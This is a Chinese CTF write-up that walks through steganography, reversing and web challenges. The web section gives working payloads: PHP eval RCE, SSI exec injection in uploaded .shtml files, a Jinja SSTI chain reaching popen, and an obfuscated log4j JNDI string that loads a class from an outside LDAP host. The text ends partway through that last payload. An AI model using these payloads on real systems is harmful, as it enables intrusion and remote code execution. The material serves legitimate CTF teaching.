<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXFdwu26MriaqSfhbWYrFeGrRxxs2eYK1f2ib2HR0a1IWKYgmia1JT5p0Zw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>找到IEND块，手动提取出png文件</p>
<p>得到1.png   <img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXhIOvfo8uJeQRiaBwvO4cSJYztguURNoMpaMUiaVJqKHqaL76gHbRz0Yg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>用stegsolve打开1.png提取低位数据，在蓝色的低位可以看到</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXRZuFb9iaTY3ztXJUw21ghRcQWlV0Uj5JIvN0hDo7SpGsRdPDebPEkbA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>d9ff，联想到jpg的文件尾，但是是倒序的，save bin提取出来得到1.bin</p>
<p>保存得到1.bin</p>
<p>搜索 d8 ff，从第一个d8 ff 开始 删掉后面的内容，然后倒序，可以用010editor的script里的stringreverse</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXRqIEKDjq8c0PPXa6e1PQTtRj2JZ5dXpswUJ0GPKgMIAK0gTOVQmtaQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>得到jpg图片</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXHQMibSJCHXNgJIWnO7rtffTq10JwwEGibBia0zUVn1Cha6ZzBIHpHCvJg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h3 id="【lemon】"><a href="#【lemon】" class="headerlink" title="【lemon】"></a>【lemon】</h3><p>题目参考2021hitcon的re题出的lemon语言的字节码，这是官网<a target="_blank" rel="noopener" href="http://www.lemon-lang.org/documentation%E4%BD%9C%E4%B8%BA%E7%AD%BE%E5%88%B0%E9%A2%98">http://www.lemon-lang.org/documentation作为签到题</a> 没有任何算法只需简单的还原字节码跑一下程序就能出flag。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">var q=[65,69,83];</span><br><span class="line">var w=[113,105,117,113,105,117,108,101,98,105,101,122,117,111,108,101];</span><br><span class="line">var e=0;</span><br><span class="line">var a=[];</span><br><span class="line">while(e&lt;256)&#123;</span><br><span class="line"> a.append(e);</span><br><span class="line"> e=e+1;</span><br><span class="line">&#125;</span><br><span class="line">var c=0;</span><br><span class="line">while(c&lt;256)&#123;</span><br><span class="line"> a[c]=(a[c]+q[c%3]+w[c%16])%256;</span><br><span class="line"> c=c+1;</span><br><span class="line">&#125;</span><br><span class="line">var i=0;</span><br><span class="line">while(i&lt;3)&#123;</span><br><span class="line"> var j=0;</span><br><span class="line"> while(j&lt;256)&#123;</span><br><span class="line">  a[j]=a[j]^a[(j+1)%256];</span><br><span class="line">  j=j+1;</span><br><span class="line"> &#125;</span><br><span class="line"> var p=0;</span><br><span class="line"> while(p&lt;256)&#123;</span><br><span class="line">  a[p]=(a[p]+1)%256;</span><br><span class="line">  p=p+1;</span><br><span class="line"> &#125;</span><br><span class="line"> i=i+1;</span><br><span class="line">&#125;</span><br><span class="line">i=0;</span><br><span class="line">var n=0;</span><br><span class="line">while(i&lt;256)&#123;</span><br><span class="line"> n=n+a[i];</span><br><span class="line"> i=i+1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">n=n*20+5;</span><br><span class="line">n=n*30-5;</span><br><span class="line">n=n*40-5;</span><br><span class="line">n=n*50+6645;</span><br><span class="line">print(n);</span><br></pre></td></tr></table></figure>

<h3 id="【hello-py】"><a href="#【hello-py】" class="headerlink" title="【hello_py】"></a>【hello_py】</h3><p>pyc反编译</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">flag=[44, 100, 3, 50, 106, 90, 5, 102, 10, 112]</span><br><span class="line">j=0</span><br><span class="line">for i in flag:</span><br><span class="line">    if j%2==0:</span><br><span class="line">        flag[j]=flag[j]^flag[j+1]</span><br><span class="line">        j+=1</span><br><span class="line">    else:</span><br><span class="line">        flag[j]=flag[j]^j</span><br><span class="line">        j+=1</span><br><span class="line"></span><br><span class="line">for i in range(len(flag)):</span><br><span class="line">    flag[i]=chr(flag[i])</span><br><span class="line">flagstr=&#x27;&#x27;</span><br><span class="line">flagstr=&#x27;&#x27;.join(flag)</span><br><span class="line"></span><br><span class="line">print(flagstr)</span><br></pre></td></tr></table></figure>

<h3 id="【combat-slogan】"><a href="#【combat-slogan】" class="headerlink" title="【combat_slogan】"></a>【combat_slogan】</h3><p>jdgui打开看main就看见加密的flag了，上面函数明显的rot13</p>
<p>在线rot13解一下就行了，然后套上flag{}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;We_w11l_f1ght_t0_end_t0_end_cazy&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【cute-doge】"><a href="#【cute-doge】" class="headerlink" title="【cute_doge】"></a>【cute_doge】</h3><p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXibOqs2ZkesvnP22yWZh6S7swJnMXyNpYcicogBASlGOwAZ5pNNffhfwA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>IDA打开ctf1.exe，搜字符串，看见ZmxhZ3tDaDFuYV95eWRzX2Nhenl9</p>
<p>base64解码就是flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Ch1na_yyds_cazy&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【SafeIM】"><a href="#【SafeIM】" class="headerlink" title="【SafeIM】"></a>【SafeIM】</h3><p>本题构造了一个封包（PACKET 结构体）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _CHARTDATAINFO</span><br><span class="line">&#123;</span><br><span class="line"> DWORD DataType : 2;  // Data type(e.g. text, picture...)</span><br><span class="line"> DWORD DataLen : 30;  // Data length</span><br><span class="line"> union</span><br><span class="line"> &#123;</span><br><span class="line">  DWORD Src;   // Source(group/private)</span><br><span class="line">  DWORD Dst;   // Destination(group/private)</span><br><span class="line"> &#125; Type;</span><br><span class="line"> union</span><br><span class="line"> &#123;</span><br><span class="line">  char Src[20]; // Source nick name(if private)</span><br><span class="line">  char Dst[20]; // Destination nick name(if private)</span><br><span class="line"> &#125; Name;</span><br><span class="line">&#125; CHARTDATAINFO, * PCHARTDATAINFO;</span><br><span class="line"></span><br><span class="line">typedef struct _PACKET</span><br><span class="line">&#123;</span><br><span class="line"> union</span><br><span class="line"> &#123;</span><br><span class="line">  DWORD Request;  // Requset type(e.g. login, logout...)</span><br><span class="line">  DWORD Reply;  // Reply type(e.g. login success, message arrive...)</span><br><span class="line"> &#125; Type;</span><br><span class="line"> CHARTDATAINFO DataInfo; // Data information</span><br><span class="line"> BYTE SessionKey[16];  // Session key</span><br><span class="line"> // Raw Data</span><br><span class="line">&#125; PACKET, * PPACKET;</span><br></pre></td></tr></table></figure>

<p>发送消息之前的核心加密逻辑（位于 <strong>SafeTcpClient::ClientPack</strong>）：</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXMq7trmXuPPzXhQVfbV6I0zSu3PGtWCUjGM4sAhaLf9ibibNzMUpMqKSQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>psk 已知，SessionKey 在 PACKET.SessionKey 可以拿到，不过这个 SessionKey 是被 XorSessionKey 函数处理过的，再用这个函数处理一下就能得到原来的 SessionKey，用还原后的 SessionKey 作为 iv，psk 作为 key，就能用标准 sm4 解密函数来解密 RawData</p>
<p>不过需要注意，客户端与服务端之间的通信使用 SSL 加密，需要用 wireshark 加载 <code>server\certs\server.key</code>，将应用层的解密数据拿出来</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXB6kAGmibvDyvMkgAMgbACyptIUHHGukiagmzFeABOlOGgOjFRtVHQmsQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>这里我把流量包中所有解密后的 Application Data 都存到 <strong>decrypted.txt</strong> 中，然后写脚本将聊天的内容 dump 出来</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import sm4</span><br><span class="line">import struct</span><br><span class="line"></span><br><span class="line">user_name = &#x27;&#x27;</span><br><span class="line">output_dir = os.path.join(os.path.dirname(__file__), &quot;dump&quot;)</span><br><span class="line"></span><br><span class="line">class Packet(object):</span><br><span class="line"> def __init__(self, raw: bytes):</span><br><span class="line">  self.raw_message = raw[48:]</span><br><span class="line">  self.meta_info = self.parse_meta_info(raw[:48])</span><br><span class="line">  self.sm4_key = b&quot;Dem0_wants_girls&quot;</span><br><span class="line">  self.sm4_iv = self.recovery_iv(self.meta_info[&quot;enc_session_key&quot;])</span><br><span class="line"></span><br><span class="line"> def __str__(self):</span><br><span class="line">  global user_name</span><br><span class="line">  format_output = &#x27;&#x27;</span><br><span class="line">  meta_info = self.meta_info</span><br><span class="line">  plain = sm4.SM4Key(self.sm4_key).decrypt(self.raw_message, self.sm4_iv)</span><br><span class="line"></span><br><span class="line">  re_type = meta_info[&quot;re_type&quot;]</span><br><span class="line">  if re_type == 0:</span><br><span class="line">   if len(plain):</span><br><span class="line">    user_name = self.parse_text(plain)</span><br><span class="line">    format_output += f&quot;[Login Request]\n\tUser `&#123;user_name&#125;` is trying to login&quot;</span><br><span class="line">   else:</span><br><span class="line">    format_output += f&quot;[Login Reply]\n\tUser `&#123;user_name&#125;` login SUCCESS&quot;</span><br><span class="line">  elif re_type == 1:</span><br><span class="line">   format_output += f&quot;[Logout]\n\tUser `&#123;user_name&#125;` logout&quot;</span><br><span class="line">  elif re_type == 2:</span><br><span class="line">   msg_type = meta_info[&quot;msg_type&quot;]</span><br><span class="line">   format_output += f&quot;[Message from &#123;meta_info[&#x27;src_nick_name&#x27;]&#125;]\n\t&quot;</span><br><span class="line">   if msg_type == 1:</span><br><span class="line">    format_output += &quot;TEXT: &quot; + self.parse_text(plain)</span><br><span class="line">   elif msg_type == 2:</span><br><span class="line">    if plain[:3] == b&quot;\xFF\xD8\xFF&quot;:</span><br><span class="line">     ext = &quot;jpg&quot;</span><br><span class="line">    elif plain[:4] == b&quot;\x89\x50\x4E\x47&quot;:</span><br><span class="line">     ext = &quot;png&quot;</span><br><span class="line">    format_output += f&quot;PICTURE: a &#123;ext&#125; file&quot;</span><br><span class="line">  elif re_type == 4:</span><br><span class="line">   format_output += &#x27;[Online Users]\n\t&#x27;</span><br><span class="line">   for i in range(len(plain)//20):</span><br><span class="line">    if i != 0:</span><br><span class="line">     format_output += &quot;, &quot;</span><br><span class="line">    format_output += self.parse_text(plain[i*20:(i+1)*20])</span><br><span class="line">  format_output += &#x27;\n&#x27;</span><br><span class="line">  return format_output</span><br><span class="line"></span><br><span class="line"> def parse_meta_info(self, raw_head: bytes) -&gt; dict:</span><br><span class="line">  assert len(raw_head) == 48, &quot;meta information data length should be 48 bytes&quot;</span><br><span class="line"></span><br><span class="line">  re_type, = struct.unpack(&quot;&lt;I&quot;, raw_head[:4])</span><br><span class="line">  bit_merged, = struct.unpack(&quot;&lt;I&quot;, raw_head[4:8])</span><br><span class="line">  msg_type = bit_merged &amp; 0b11</span><br><span class="line">  msg_len = bit_merged &gt;&gt; 2</span><br><span class="line">  dst_user_type, = struct.unpack(&quot;&lt;I&quot;, raw_head[8:12])</span><br><span class="line">  src_nick_name = self.parse_text(raw_head[12:32])</span><br><span class="line">  enc_session_key = raw_head[32:]</span><br><span class="line">  return dict(</span><br><span class="line">   msg_type=msg_type, msg_len=msg_len,</span><br><span class="line">   re_type=re_type, enc_session_key=enc_session_key,</span><br><span class="line">   dst_user_type=dst_user_type, src_nick_name=src_nick_name</span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line"> def dump(self, idx: int):</span><br><span class="line">  assert self.meta_info[&quot;msg_len&quot;] == len(self.raw_message), &quot;broken packet&quot;</span><br><span class="line"></span><br><span class="line">  msg_type = self.meta_info[&quot;msg_type&quot;]</span><br><span class="line">  plain = sm4.SM4Key(self.sm4_key).decrypt(self.raw_message, self.sm4_iv)</span><br><span class="line"></span><br><span class="line">  if msg_type == 0:</span><br><span class="line">   pass</span><br><span class="line">  elif msg_type == 1:</span><br><span class="line">   file_name = os.path.join(output_dir, f&quot;&#123;idx&#125;.txt&quot;)</span><br><span class="line">   with open(file_name, &#x27;w&#x27;) as f:</span><br><span class="line">    f.write(self.parse_text(plain))</span><br><span class="line">  elif msg_type == 2:</span><br><span class="line">   if plain[:3] == b&quot;\xFF\xD8\xFF&quot;:</span><br><span class="line">    ext = &quot;jpg&quot;</span><br><span class="line">   elif plain[:4] == b&quot;\x89\x50\x4E\x47&quot;:</span><br><span class="line">    ext = &quot;png&quot;</span><br><span class="line">   file_name = os.path.join(output_dir, f&quot;&#123;idx&#125;.&#123;ext&#125;&quot;)</span><br><span class="line">   with open(file_name, &#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(plain)</span><br><span class="line"></span><br><span class="line"> @staticmethod</span><br><span class="line"> def parse_text(raw: bytes) -&gt; str:</span><br><span class="line">  for idx, c in enumerate(raw):</span><br><span class="line">   if c == 0:</span><br><span class="line">    return raw[:idx].decode()</span><br><span class="line">  return raw.decode()</span><br><span class="line"></span><br><span class="line"> @staticmethod</span><br><span class="line"> def recovery_iv(raw_key: bytes) -&gt; bytes:</span><br><span class="line">  key = b&quot;&quot;</span><br><span class="line">  for i in range(4):</span><br><span class="line">   dword, = struct.unpack(&quot;&lt;I&quot;, raw_key[i*4:(i+1)*4])</span><br><span class="line">   ori = dword ^ ((i + 1) * 0x520C37 &amp; 0xFFFFFFFF)</span><br><span class="line">   key += ori.to_bytes(4, &quot;little&quot;)</span><br><span class="line">  return key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"> with open(&quot;decrypted.txt&quot;) as f:</span><br><span class="line">  raw_data = f.read().split(&#x27;\n&#x27;)</span><br><span class="line"> if not os.path.exists(output_dir):</span><br><span class="line">  os.mkdir(output_dir)</span><br><span class="line"> for idx, raw in enumerate(raw_data):</span><br><span class="line">  packet = Packet(bytes.fromhex(raw))</span><br><span class="line">  packet.dump(idx)</span><br><span class="line">  print(packet)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line"> main()</span><br></pre></td></tr></table></figure>

<p>查看 dump 文件夹，flag 是由图片和纯文本构成的：</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXfKF9CVxH8FHfu6icPTWXUy8nf0otKCrJAaGoCyEgJic7hFVjgnlMhsvg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>从编号 5 到 42都是 flag 的字符，按顺序拼接起来得到 flag</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h3 id="【RCE-No-Para】"><a href="#【RCE-No-Para】" class="headerlink" title="【RCE_No_Para】"></a>【RCE_No_Para】</h3><p>源码：<img src="/2022/01/09/WriteUp/1.png" alt=" "></p>
<p>查看可以利用的全局变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">  [&quot;_GET&quot;]=&gt;</span><br><span class="line">  array(1) &#123;</span><br><span class="line">    [&quot;code&quot;]=&gt;</span><br><span class="line">    string(29) &quot;var_dump(get_defined_vars());&quot;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_POST&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_COOKIE&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;_FILES&quot;]=&gt;</span><br><span class="line">  array(0) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过$_GET传参进行rce</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=system(&#x27;tac flag.php&#x27;);&amp;code=eval(current(current(get_defined_vars())))</span><br></pre></td></tr></table></figure>

<p>如下：</p>
<p><img src="/2022/01/09/WriteUp/2.png" alt=" "></p>
<h3 id="【Baby-Upload】"><a href="#【Baby-Upload】" class="headerlink" title="【Baby_Upload】"></a>【Baby_Upload】</h3><p>预想中图片什么的是可以正常上传的，但是后来加了对文件内容的检测，过滤了一些符号，忘了图片中也会有那些符号了，结果最后就导致图片也没办法上传，不过不会影响正常解题，过滤了<code>ph,ini,htaccess</code>，绕过不去，可以<code>shtml</code>来利用SSI注入RCE，但是过滤了很多命令</p>
<p><code>ls</code>被过滤可以使用<code>dir</code>来列目录：</p>
<p><code>&lt;!--#exec cmd=&quot;dir /&quot;--&gt;:</code></p>
<p><img src="/2022/01/09/WriteUp/3.png"></p>
<p>上传此文件，如下图所示：</p>
<p><img src="/2022/01/09/WriteUp/4.png"></p>
<p>接着会出现目录下的文件</p>
<p><img src="/2022/01/09/WriteUp/5.png"></p>
<p>很明显有flag，但是cat，tac，nl等等读文件的命令都没了，测了一下还有awk，cut，strings。因为fl被过滤了，可以用<br>？来匹配，可以构造出：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;cut -b 1-100 /ffffff?llll11111aaaaa4444ggggg&quot;--&gt;</span><br></pre></td></tr></table></figure>

<p>来读取文件，存为<code>2.shtml</code>后上传</p>
<p><img src="/2022/01/09/WriteUp/6.png"></p>
<p>获得flag。</p>
<h3 id="【flask】"><a href="#【flask】" class="headerlink" title="【flask】"></a>【flask】</h3><p>访问主页发现注释中有提示</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuX1HkPmI2zU03w3zKcBA57cc7f5pBetskxZrXIMmEBSWhicrXIeibADibJg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>/admin  /static.js  一段python代码 此段代码为后端的URL Filter 当请求js类静态文件时不需要认证，而在请求其他路径时则会被重定向到login 在flask的官方文档中</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXErQ0o06QaX7jBDouicgBdFFcHfyHiasJiaB48VZwJem1dO3xkbgfGsJ9A/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>在请求<a target="_blank" rel="noopener" href="http://localhost/admin?test=123">http://localhost/admin?test=123</a></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXoKEiclPz0dSCoNZDDAxic6j1X2P2ELrRnCpBmDQDbh1bdiaXTicwSrCLPA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>而请求/admin;xxx=1&amp;test=123</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuX8XKaYbaeqFcVcicOmwPibt3BWAtutVOQGLdDdbF5zzjJT82kdxNa1lrQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<p>对<code>request.path</code> 来说其值为<code>/admin;xxx=1</code>并没有把<code>path parameter</code>去掉，在代码中的判断使用的是<code>request.full_path</code><br>而在<code>request.full_path</code>中是包含了<code>query string</code>因此只要发起这样的请求：随意增加一个参数，并且参数值是以.js?结尾即可绕过校检<code>/admin?xxx=.js?</code>这里不能用<code>;</code>的原因是<code>request.path</code>并没有去掉 <code>path parameter</code> 在没有带上<code>query string</code>的情况下<code>full_path：/admin;x=.js?</code>满足<code>.js?</code>而<code>request.path:/admin;x=.js</code>路由表中没有<code>admin;x=.js</code>从而404</p>
<p>进入之后就是常规的ssti绕沙箱</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXPJI3FtI4pYm79hU6bDODs8b5GWjCWHtUUnkrVQxicwnrlJfFMxXmIBQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">aa:__class__ </span><br><span class="line">bb:__mro__</span><br><span class="line">cc:__subclasses__</span><br><span class="line">dd:__init__</span><br><span class="line">ee:__globals__</span><br></pre></td></tr></table></figure>

<p><code>((((request|attr(request.cookies.get(&#39;aa&#39;))|attr(request.cookies.get(&#39;bb&#39;))|list).pop(-1)|attr(request.cookies.get(&#39;cc&#39;))()).pop(117)|attr(request.cookies.get(&#39;dd&#39;))|attr(request.cookies.get(&#39;ee&#39;))).get(&#39;popen&#39;)(&#39;ls&#39;).read())</code></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/H1BQmtw9nCiawnIJEfCoBrwOSgvUktCuXqUVCzrzORedxZSc8q430ibtFGTLbtzUicFF3krLefNxiatOzm0sv6y8qg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1"></p>
<h3 id="【Shiro-】"><a href="#【Shiro-】" class="headerlink" title="【Shiro?】"></a>【Shiro?】</h3><p>虽然登录界面伪造了一个shiro反序列化漏洞，但是实际漏洞点是在登录处的log4j2RCE漏洞。起一个ldap服务用于加载恶意类。运行环境Java版本较高需要bypass，即可正常攻击，可利用JNDIExploit工具进行攻击。用{::-n}等规则替换关键字和ip地址即可绕过规则， 也可用woodpecker生成payload， 在登录点username处输入payload即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;kBQ:aUR:j:-j&#125;$&#123;MoYvsH:XAND:kG:-n&#125;$&#123;EdAUxY:ck:pyjko:RIasA:-d&#125;$&#123;hNhKmh:E:c:-i&#125;$&#123;l:MLjM:-:&#125;$&#123;qvO:STYFpz:ufnqW:V:-l&#125;$&#123;G:mIWH:-d&#125;$&#123;er:WLe:J:Pl:kCih:-a&#125;$&#123;yHjTcA:FM:e:IktQAC:-p&#125;$&#123;bvaWm:WW:-:&#125;$&#123;kB:hGD:GPI:-/&#125;$&#123;GC:VOUh:dqINYx:FK:n:-/&#125;$&#123;v:KHSOc:-1&#125;$&#123;Li:-9&#125;$&#123;QtYkc:o:CQBzJl:D:-2&#125;$&#123;KmJs:oJznyf:oIDrB:zmdK:-.&#125;$&#123;F:ttejsH:k:rI:-1&#125;$&#123;gN:-6&#125;$&#123;tB:aJqxS:-8&#125;$&#123;arq:J:wcas:d:-.&#125;$&#123;rh:Rcz:-2&#125;$&#123;z:Gvz:-.&#125;$&#123;F:-2&#125;$&#123;IsgAtf:-3&#125;$&#123;CPsF:QRLx:dICC:rMp:-8&#125;$&#123;o:Kk:hmhWl:XjIbnJ:-:&#125;$&#123;kp:-1&#125;$&#123;PeOoN:Y:mIFi:-3&#125;$&#123;P:-8&#125;$&#123;YMhc:EJ:uD:Wwytb:-9&#125;$&#123;OLPfY:YTvJf:m:OXdV:-/&#125;$&#123;rf:Uagil:PDiuPH:-T&#125;$&#123;PBKgU:NhAyi:MpIN:-o&#125;$&#123;awgT:-m&#125;$&#123;aS:TCt:xnzwfF:UNaIr:Ppp:-c&#125;$&#123;II:kNl:uHtTJi:WXfR:UjzJC:-a&#125;$&#123;jBHdVl:PB:-t&#125;$&#123;bkgfV:sYiJoF:uBIIDN:-B&#125;$&#123;WROI:-y&#125;$&#123;U:F:GAnUD:-p&#125;$&#123;nQMY:-a&#125;$&#123;yqYF:-s&#125;$&#123;cVWi:rs:NFv:f:wmqbfG:-s&#125;$&#123;XjHqnt:sP:uSjj:dWkcba:njEm:-/&#125;$&#123;CY:-T&#125;$&#123;qeW: